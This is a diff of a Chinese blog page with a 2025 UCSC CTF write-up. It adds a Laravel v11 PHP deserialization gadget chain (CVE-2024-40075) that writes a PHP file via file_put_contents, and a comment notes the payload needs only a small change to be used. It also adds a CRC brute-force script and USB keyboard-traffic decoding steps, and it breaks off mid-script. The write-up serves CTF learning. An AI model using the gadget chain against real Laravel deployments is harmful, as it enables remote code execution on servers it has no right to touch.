@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web 直接dirsearch扫描得flag.php即可\nmisc three-ucsc 盲水印命令\n1 java -jar BlindWatermark-v0.0.3.jar decode -f signwithflag.png flag.png 得到8f02d3e7\n然后二进制转base64转摩斯\n-ce89-4d6b-830e-\n流量包追逐流一翻找到part3密码\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web 直接dirsearch扫描得flag.php即可\n预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 &lt;?php namespace Termwind\\ValueObjects{ Class Styles{ private array $textModifiers; private array $properties; public function __construct(){ $this-&gt;textModifiers = [&#34;file_put_contents&#34;]; $this-&gt;properties = [&#34;styles&#34;=&gt;&#34;&lt;?php phpinfo();?&gt;&#34;, &#34;parentStyles&#34;=&gt;0]; }\t#命令稍微改一下就能打了 } } namespace Termwind\\Components{ use Termwind\\ValueObjects\\Styles; abstract Class Element{ protected string $content; protected Styles $styles; public function __construct() { $this-&gt;content = &#39;testtesttest.php&#39;; $this-&gt;styles = new Styles(); } } Class Hr extends Element{} } namespace Psy\\Readline\\Hoa{ use Termwind\\Components\\Hr; abstract Class Stream{ protected $_bucket; public function __construct(){ $this-&gt;_bucket = [new Hr()]; } } Class FileRead extends Stream {} } namespace Monolog\\Handler{ use Psy\\Readline\\Hoa\\FileRead; Class GroupHandler{ protected array $handlers; public function __construct(){ $this-&gt;handlers = [new FileRead()]; } } } namespace { $obj = new Monolog\\Handler\\GroupHandler(); echo base64_encode(serialize($obj)); } Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)-先知社区\n">
 <title>2025-UCSC-CTF</title>
 
 <link rel='canonical' href='https://luo-kaihong.github.io/p/2025-ucsc-ctf/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="2025-UCSC-CTF">
-<meta property='og:description' content=" web 直接dirsearch扫描得flag.php即可\nmisc three-ucsc 盲水印命令\n1 java -jar BlindWatermark-v0.0.3.jar decode -f signwithflag.png flag.png 得到8f02d3e7\n然后二进制转base64转摩斯\n-ce89-4d6b-830e-\n流量包追逐流一翻找到part3密码\n">
+<meta property='og:description' content=" web 直接dirsearch扫描得flag.php即可\n预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 &lt;?php namespace Termwind\\ValueObjects{ Class Styles{ private array $textModifiers; private array $properties; public function __construct(){ $this-&gt;textModifiers = [&#34;file_put_contents&#34;]; $this-&gt;properties = [&#34;styles&#34;=&gt;&#34;&lt;?php phpinfo();?&gt;&#34;, &#34;parentStyles&#34;=&gt;0]; }\t#命令稍微改一下就能打了 } } namespace Termwind\\Components{ use Termwind\\ValueObjects\\Styles; abstract Class Element{ protected string $content; protected Styles $styles; public function __construct() { $this-&gt;content = &#39;testtesttest.php&#39;; $this-&gt;styles = new Styles(); } } Class Hr extends Element{} } namespace Psy\\Readline\\Hoa{ use Termwind\\Components\\Hr; abstract Class Stream{ protected $_bucket; public function __construct(){ $this-&gt;_bucket = [new Hr()]; } } Class FileRead extends Stream {} } namespace Monolog\\Handler{ use Psy\\Readline\\Hoa\\FileRead; Class GroupHandler{ protected array $handlers; public function __construct(){ $this-&gt;handlers = [new FileRead()]; } } } namespace { $obj = new Monolog\\Handler\\GroupHandler(); echo base64_encode(serialize($obj)); } Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)-先知社区\n">
 <meta property='og:url' content='https://luo-kaihong.github.io/p/2025-ucsc-ctf/'>
 <meta property='og:site_name' content='罗铠鸿'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-04-20T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-04-20T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="2025-UCSC-CTF">
-<meta name="twitter:description" content=" web 直接dirsearch扫描得flag.php即可\nmisc three-ucsc 盲水印命令\n1 java -jar BlindWatermark-v0.0.3.jar decode -f signwithflag.png flag.png 得到8f02d3e7\n然后二进制转base64转摩斯\n-ce89-4d6b-830e-\n流量包追逐流一翻找到part3密码\n">
+<meta name="twitter:description" content=" web 直接dirsearch扫描得flag.php即可\n预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 &lt;?php namespace Termwind\\ValueObjects{ Class Styles{ private array $textModifiers; private array $properties; public function __construct(){ $this-&gt;textModifiers = [&#34;file_put_contents&#34;]; $this-&gt;properties = [&#34;styles&#34;=&gt;&#34;&lt;?php phpinfo();?&gt;&#34;, &#34;parentStyles&#34;=&gt;0]; }\t#命令稍微改一下就能打了 } } namespace Termwind\\Components{ use Termwind\\ValueObjects\\Styles; abstract Class Element{ protected string $content; protected Styles $styles; public function __construct() { $this-&gt;content = &#39;testtesttest.php&#39;; $this-&gt;styles = new Styles(); } } Class Hr extends Element{} } namespace Psy\\Readline\\Hoa{ use Termwind\\Components\\Hr; abstract Class Stream{ protected $_bucket; public function __construct(){ $this-&gt;_bucket = [new Hr()]; } } Class FileRead extends Stream {} } namespace Monolog\\Handler{ use Psy\\Readline\\Hoa\\FileRead; Class GroupHandler{ protected array $handlers; public function __construct(){ $this-&gt;handlers = [new FileRead()]; } } } namespace { $obj = new Monolog\\Handler\\GroupHandler(); echo base64_encode(serialize($obj)); } Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)-先知社区\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -281,7 +281,11 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#web">web</a></li>
+    <li><a href="#web">web</a>
+      <ol>
+        <li><a href="#预期解打laravel-v11x-php反序列化漏洞分析cve-2024-40075">预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)</a></li>
+      </ol>
+    </li>
     <li><a href="#misc">misc</a>
       <ol>
         <li><a href="#three-ucsc"><strong>three-ucsc</strong></a></li>
@@ -289,6 +293,15 @@
           <ol>
             <li><a href="#补充残缺的png头our-secret解密">补充残缺的png头+Our Secret解密</a></li>
             <li><a href="#crc爆破">crc爆破</a></li>
+          </ol>
+        </li>
+        <li><a href="#usb">USB</a></li>
+        <li><a href="#noshark">No.shArk</a>
+          <ol>
+            <li><a href="#dns协议隐写">dns协议隐写</a></li>
+            <li><a href="#snow隐写">snow隐写</a></li>
+            <li><a href="#jpg-silenteye隐写">jpg silenteye隐写</a></li>
+            <li><a href="#arnold猫脸变换">Arnold猫脸变换</a></li>
           </ol>
         </li>
       </ol>
@@ -361,7 +374,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 3 分钟
+                    阅读时长: 8 分钟
                 </time>
             </div>
         
@@ -379,6 +392,115 @@
     <hr>
 <h2 id="web">web
 </h2><p>直接dirsearch扫描得flag.php即可</p>
+<h3 id="预期解打laravel-v11x-php反序列化漏洞分析cve-2024-40075">预期解打Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Termwind\ValueObjects</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">Styles</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="k">array</span> <span class="nv">$textModifiers</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="k">array</span> <span class="nv">$properties</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">textModifiers</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;file_put_contents&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">properties</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;styles&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;parentStyles&#34;</span><span class="o">=&gt;</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>			<span class="c1">#命令稍微改一下就能打了
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Termwind\Components</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Termwind\ValueObjects\Styles</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">Class</span> <span class="nc">Element</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nx">string</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nx">Styles</span> <span class="nv">$styles</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">content</span> <span class="o">=</span> <span class="s1">&#39;testtesttest.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">styles</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Styles</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">Hr</span> <span class="k">extends</span> <span class="nx">Element</span><span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Psy\Readline\Hoa</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Termwind\Components\Hr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">Class</span> <span class="nc">Stream</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$_bucket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_bucket</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nx">Hr</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">FileRead</span> <span class="k">extends</span> <span class="nx">Stream</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">Monolog\Handler</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">use</span> <span class="nx">Psy\Readline\Hoa\FileRead</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">Class</span> <span class="nc">GroupHandler</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="k">array</span> <span class="nv">$handlers</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handlers</span> <span class="o">=</span> <span class="p">[</span><span class="k">new</span> <span class="nx">FileRead</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Monolog\Handler\GroupHandler</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://xz.aliyun.com/news/14564"  target="_blank" rel="noopener"
+    >Laravel v11.x PHP反序列化漏洞分析(CVE-2024-40075)-先知社区</a></p>
 <h2 id="misc">misc
 </h2><h3 id="three-ucsc"><strong>three-ucsc</strong>
 </h3><p>盲水印命令</p>
@@ -572,13 +694,559 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">提一句：这个工具可以爆破，但是由于前面提取就不是按顺序，所以把爆破后拼接顺序也不对，其实可以让gpt将这些crc碰撞的值按文件顺序拼接就可以得到正确的结果。
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">但是这个工具只能4字节一下，但是crc爆破范围是18字节以下，如果遇到其实也只需要找脚本把文件的crc提取出来再用上面的脚本就好了，这个工具纯省力，运气好梭哈。
+</span></span><span class="line"><span class="cl">但是这个工具只能4字节以下，但是crc爆破范围是18字节以下，如果遇到其实也只需要找脚本把文件的crc提取出来再用上面的脚本就好了，这个工具纯省力，运气好梭哈。
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="image-20250420222122635.png" alt="image-20250420222122635" style="zoom:50%;" />
-<p>之后就是解密了</p>
+<p>当然这里偷了一个大佬的脚本</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from binascii import crc32
+</span></span><span class="line"><span class="cl">import string
+</span></span><span class="line"><span class="cl">import zipfile
+</span></span><span class="line"><span class="cl">dic=string.printable
+</span></span><span class="line"><span class="cl">def CrackCrc(crc):
+</span></span><span class="line"><span class="cl">    for i in dic :
+</span></span><span class="line"><span class="cl">        # print (i)
+</span></span><span class="line"><span class="cl">        for j in dic:
+</span></span><span class="line"><span class="cl">            for p in dic:
+</span></span><span class="line"><span class="cl">                for q in dic:
+</span></span><span class="line"><span class="cl">                    s=i+j+p+q
+</span></span><span class="line"><span class="cl">                    # print (crc32(bytes(s,&#39;ascii&#39;)) &amp; 0xffffffff)
+</span></span><span class="line"><span class="cl">                    if crc == (crc32(bytes(s,&#39;ascii&#39;)) &amp; 0xffffffff):
+</span></span><span class="line"><span class="cl">                        print (s)
+</span></span><span class="line"><span class="cl">                        return
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">def getcrc32(fname):
+</span></span><span class="line"><span class="cl">    l=[]
+</span></span><span class="line"><span class="cl">    file = fname
+</span></span><span class="line"><span class="cl">    f = zipfile.ZipFile(file, &#39;r&#39;)
+</span></span><span class="line"><span class="cl">    global fileList
+</span></span><span class="line"><span class="cl">    fileList =f.namelist ()
+</span></span><span class="line"><span class="cl">    print (fileList)
+</span></span><span class="line"><span class="cl">    # print (type(fileList))
+</span></span><span class="line"><span class="cl">    for filename in fileList:
+</span></span><span class="line"><span class="cl">        Fileinfo = f.getinfo(filename)
+</span></span><span class="line"><span class="cl">        # print(Fileinfo)
+</span></span><span class="line"><span class="cl">        crc = Fileinfo.CRC
+</span></span><span class="line"><span class="cl">        # print (&#39;crc&#39;,crc)
+</span></span><span class="line"><span class="cl">        l.append(crc)
+</span></span><span class="line"><span class="cl">    return l
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">def main (filename=None):
+</span></span><span class="line"><span class="cl">    l = getcrc32(filename)
+</span></span><span class="line"><span class="cl">    # print(l)
+</span></span><span class="line"><span class="cl">    for i in range(len(l)):
+</span></span><span class="line"><span class="cl">        print(fileList[i], end=&#39;的内容是:&#39;)
+</span></span><span class="line"><span class="cl">        CrackCrc(l[i])
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">if __name__  == &#34;__main__&#34;:
+</span></span><span class="line"><span class="cl">    main (&#39;test.zip&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行python crc32.py即可，这个更慢，但是没什么字节限制</p>
+<p>爆破之后就是解密了</p>
 <img src="image-20250420223610522.png" alt="image-20250420223610522" style="zoom:50%;" />
 <p>这题套题有点难受：<strong>伪加密+补全残缺png+crc爆破+our Secret解密</strong></p>
+<h3 id="usb">USB
+</h3><p><a class="link" href="https://www.freebuf.com/sectool/347971.html"  target="_blank" rel="noopener"
+    >CTF中我的USB键盘鼠标流量解密指南和脚本 - FreeBuf网络安全行业门户</a></p>
+<p><a class="link" href="https://p001water.github.io/%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90/usb/2022/11/05/CTF-CTF%e4%b8%ad%e6%88%91%e7%9a%84USB%e9%94%ae%e7%9b%98%e9%bc%a0%e6%a0%87%e6%b5%81%e9%87%8f%e8%a7%a3%e5%af%86%e6%8c%87%e5%8d%97%e5%92%8c%e8%84%9a%e6%9c%ac.html"  target="_blank" rel="noopener"
+    >CTF &ndash; CTF中我的USB键盘鼠标流量解密指南和脚本</a></p>
+<p><a class="link" href="https://nnnpc.github.io/2024/04/16/USB/"  target="_blank" rel="noopener"
+    >USB - 流量分析 - 流量 | nnnpc&rsquo;s Blog = 低头学习 抬头看路 = 很多人已经做到了，而他们都曾经和现在的你站在同样的起点上</a></p>
+<p>先去kali执行命令提取数据</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tshark -r flag.pcap  -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; data.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后写代码解密即可</p>
+<p>本来想用上面文章的工具，但是脚本还需要根据实际情况修改，所以索性直接gpt写脚本处理提取出来的data.txt</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 自定义 HID 映射表（十六进制小写字符串作为键）</span>
+</span></span><span class="line"><span class="cl"><span class="n">hid_keymap</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;04&#34;</span><span class="p">:</span> <span class="s2">&#34;a&#34;</span><span class="p">,</span> <span class="s2">&#34;05&#34;</span><span class="p">:</span> <span class="s2">&#34;b&#34;</span><span class="p">,</span> <span class="s2">&#34;06&#34;</span><span class="p">:</span> <span class="s2">&#34;c&#34;</span><span class="p">,</span> <span class="s2">&#34;07&#34;</span><span class="p">:</span> <span class="s2">&#34;d&#34;</span><span class="p">,</span> <span class="s2">&#34;08&#34;</span><span class="p">:</span> <span class="s2">&#34;e&#34;</span><span class="p">,</span> <span class="s2">&#34;09&#34;</span><span class="p">:</span> <span class="s2">&#34;f&#34;</span><span class="p">,</span> <span class="s2">&#34;0a&#34;</span><span class="p">:</span> <span class="s2">&#34;g&#34;</span><span class="p">,</span> <span class="s2">&#34;0b&#34;</span><span class="p">:</span> <span class="s2">&#34;h&#34;</span><span class="p">,</span> <span class="s2">&#34;0c&#34;</span><span class="p">:</span> <span class="s2">&#34;i&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0d&#34;</span><span class="p">:</span> <span class="s2">&#34;j&#34;</span><span class="p">,</span> <span class="s2">&#34;0e&#34;</span><span class="p">:</span> <span class="s2">&#34;k&#34;</span><span class="p">,</span> <span class="s2">&#34;0f&#34;</span><span class="p">:</span> <span class="s2">&#34;l&#34;</span><span class="p">,</span> <span class="s2">&#34;10&#34;</span><span class="p">:</span> <span class="s2">&#34;m&#34;</span><span class="p">,</span> <span class="s2">&#34;11&#34;</span><span class="p">:</span> <span class="s2">&#34;n&#34;</span><span class="p">,</span> <span class="s2">&#34;12&#34;</span><span class="p">:</span> <span class="s2">&#34;o&#34;</span><span class="p">,</span> <span class="s2">&#34;13&#34;</span><span class="p">:</span> <span class="s2">&#34;p&#34;</span><span class="p">,</span> <span class="s2">&#34;14&#34;</span><span class="p">:</span> <span class="s2">&#34;q&#34;</span><span class="p">,</span> <span class="s2">&#34;15&#34;</span><span class="p">:</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;16&#34;</span><span class="p">:</span> <span class="s2">&#34;s&#34;</span><span class="p">,</span> <span class="s2">&#34;17&#34;</span><span class="p">:</span> <span class="s2">&#34;t&#34;</span><span class="p">,</span> <span class="s2">&#34;18&#34;</span><span class="p">:</span> <span class="s2">&#34;u&#34;</span><span class="p">,</span> <span class="s2">&#34;19&#34;</span><span class="p">:</span> <span class="s2">&#34;v&#34;</span><span class="p">,</span> <span class="s2">&#34;1a&#34;</span><span class="p">:</span> <span class="s2">&#34;w&#34;</span><span class="p">,</span> <span class="s2">&#34;1b&#34;</span><span class="p">:</span> <span class="s2">&#34;x&#34;</span><span class="p">,</span> <span class="s2">&#34;1c&#34;</span><span class="p">:</span> <span class="s2">&#34;y&#34;</span><span class="p">,</span> <span class="s2">&#34;1d&#34;</span><span class="p">:</span> <span class="s2">&#34;z&#34;</span><span class="p">,</span> <span class="s2">&#34;1e&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;1f&#34;</span><span class="p">:</span> <span class="s2">&#34;2&#34;</span><span class="p">,</span> <span class="s2">&#34;20&#34;</span><span class="p">:</span> <span class="s2">&#34;3&#34;</span><span class="p">,</span> <span class="s2">&#34;21&#34;</span><span class="p">:</span> <span class="s2">&#34;4&#34;</span><span class="p">,</span> <span class="s2">&#34;22&#34;</span><span class="p">:</span> <span class="s2">&#34;5&#34;</span><span class="p">,</span> <span class="s2">&#34;23&#34;</span><span class="p">:</span> <span class="s2">&#34;6&#34;</span><span class="p">,</span> <span class="s2">&#34;24&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span><span class="p">,</span> <span class="s2">&#34;25&#34;</span><span class="p">:</span> <span class="s2">&#34;8&#34;</span><span class="p">,</span> <span class="s2">&#34;26&#34;</span><span class="p">:</span> <span class="s2">&#34;9&#34;</span><span class="p">,</span> <span class="s2">&#34;27&#34;</span><span class="p">:</span> <span class="s2">&#34;0&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;28&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;RET&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;29&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;ESC&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;2a&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;DEL&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;2b&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\t</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;2c&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;SPACE&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;2d&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;2e&#34;</span><span class="p">:</span> <span class="s2">&#34;=&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;2f&#34;</span><span class="p">:</span> <span class="s2">&#34;[&#34;</span><span class="p">,</span> <span class="s2">&#34;30&#34;</span><span class="p">:</span> <span class="s2">&#34;]&#34;</span><span class="p">,</span> <span class="s2">&#34;31&#34;</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;32&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;NON&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;33&#34;</span><span class="p">:</span> <span class="s2">&#34;;&#34;</span><span class="p">,</span> <span class="s2">&#34;34&#34;</span><span class="p">:</span> <span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s2">&#34;35&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;GA&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;36&#34;</span><span class="p">:</span> <span class="s2">&#34;,&#34;</span><span class="p">,</span>
